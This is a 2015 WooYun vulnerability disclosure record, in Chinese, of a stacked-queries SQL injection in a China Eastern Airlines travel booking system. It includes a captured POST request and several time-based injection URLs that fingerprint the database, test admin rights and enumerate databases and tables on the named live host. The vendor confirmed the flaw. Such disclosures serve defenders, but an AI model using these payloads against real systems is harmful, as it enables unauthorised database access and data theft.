{"id": 71429, "wybug_id": "wooyun-2015-0146415", "wybug_title": "中国东方航空某系统SQL注入（stacked queries注入，可跨34个库及数据）", "wybug_corp": "中国东方航空股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-10-13 19:56", "wybug_open_date": "2015-11-27 21:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-27：\t细节向公众公开  简要描述： 希望不是 @Xmyth_夏洛克 大哥提交的那个地方吧~ 详细说明：  目标站点：mceair.962008.com发现注入点：（注入类型：stacked queries；注入参数：Post中的每个参数都存在）\nPOST /ROUTE/Default.aspx HTTP/1.1Content-Length: 260Content-Type: application/x-www-form-urlencodedReferer: http://mceair.962008.com/ROUTE/Default.aspx?keyword=%u666E%u5409%u5C9B&KeyChannelType=Cookie: ASP.NET_SessionId=zctv03hiojuo3ak5orwv4mqh; firstEnterUrlInSession=http%3A//mceair.962008.com/Control/Destination.aspx; Hm_lvt_55ef9cc1e851c15fa3e50aaa16afeeff=1444658930; Hm_lpvt_55ef9cc1e851c15fa3e50aaa16afeeff=1444658937; ROUTE=ouid=112624106&DESTINATION=%5b%22ToCity%7c%e6%99%ae%e5%90%89%e5%b2%9b%22%5d; FromCityCookie=FromCity=%e9%87%8d%e5%ba%86Host: mceair.962008.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*keyBound=&KeyChannelType=&KeyDayAndNight=&keyMark=&keyMaxDate=1&keyMaxRate=1&keyMinDate=1&keyMinRate=1&KeyRouteArea=&KeyRouteType=&keySort=&KeyToCity=&KeyToCountry=&KeyToProvince=1&QuerySearch%24hfldChannelType=&__VIEWSTATE=/wEPDwULLTEwMjQ1NzE0NzFkZA%3d%3d\n此处以KeyChannelType参数为例：\n\n此处注入需要另加三个反括号闭合——“')))”，SQLMAP没跑出来，抓包看了下就是因为那三个反括号闭合没绕出来；不过既然是stacked queries注入，那手工报错注入来也很方便了。当前数据库：sh962008\nhttp://mceair.962008.com/ROUTE/Default.aspx?keyword=马尔代夫&KeyChannelType=')));IF(1=db_name()) WAITFOR DELAY '0:0:5'--\n\n\n查了下，当前数据库用户并不是数据库管理员\nhttp://mceair.962008.com/ROUTE/Default.aspx?keyword=马尔代夫&KeyChannelType=')));IF(IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'--\n但是可以跨库，估计没配置好……1、以下语句返回延时结果，可得出共34个库\nhttp://mceair.962008.com/ROUTE/Default.aspx?keyword=%u9A6C%u5C14%u4EE3%u592B&KeyChannelType=')));IF((SELECT count(Name) FROM Master..SysDatabases )=346) WAITFOR DELAY '0:0:5'--\n2、以下语句可跑出每个库的库名（top n in [1,34]）\nhttp://mceair.962008.com/ROUTE/Default.aspx?keyword=马尔代夫&KeyChannelType=')));IF((select top 1 name from sysobjects where xtype='U' and id not in(select top n id from sysobjects where xtype='U'))=1) WAITFOR DELAY '0:0:5'--\n不一一列出，只举一例。\n\n安全考虑，执行cmd命令、其他数据就不搞了   漏洞证明：     修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-10-13 20:58 厂商回复： 已联系项目经理进行整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}